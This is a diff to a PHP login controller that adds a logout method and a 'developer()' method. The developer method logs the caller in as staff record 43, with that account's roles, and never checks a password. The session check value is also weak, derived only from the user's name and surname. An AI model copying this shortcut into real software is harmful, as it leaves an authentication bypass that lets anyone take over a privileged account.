@@ -68,9 +68,9 @@ class Login extends Controller
 				return redirect('/login')->with('err_code', ['type' => 'error', 'msg' => 'Authentification failed!']);
 			}
 			
-			$id = $in_table->id;
+			$id = $in_table->s_id;
 			$check = sha1(md5($in_table->name.$in_table->surname).$in_table->surname);
-			$role = $in_table->role;
+			$role = json_decode($in_table->roles);
 
 			$role = (!$role) ? [] : $role;
 
@@ -86,7 +86,36 @@ class Login extends Controller
 		}
 	
 		return redirect('/login')->with('err_code', ['type' => 'error', 'msg' => 'Authentification failed!']);
-		
+	}
+
+	public function logout_action(){
+		if(isLogged()){
+			session()->forget('user');
+			return redirect('/')->with('err_code', ['type' => 'success', 'msg' => 'Successfuly logged out']);
+		}else{
+			return redirect('/login')->with('err_code', ['type' => 'error', 'msg' => 'Your session expired']);
+		}
+		return redirect('/login')->with('err_code', ['type' => 'error', 'msg' => 'Internal server error']);
+	}
+
+	public function developer(){
+
+		$in_table = DB::table('staff')->where('s_id', 43)->first();
+
+		$id = $in_table->s_id;
+		$check = sha1(md5($in_table->name.$in_table->surname).$in_table->surname);
+		$role = json_decode($in_table->roles);
+
+		$role = (!$role) ? [] : $role;
+		$user = [
+			'id' => $id,
+			'logged' => true,
+			'role' => $role,
+			'check' => $check,
+		];
+
+		session()->put('user', $user);
+		return redirect('/')->with('err_code', ['type' => 'info', 'msg' => 'Mal by si mat prava']);
 	}
 	
 }
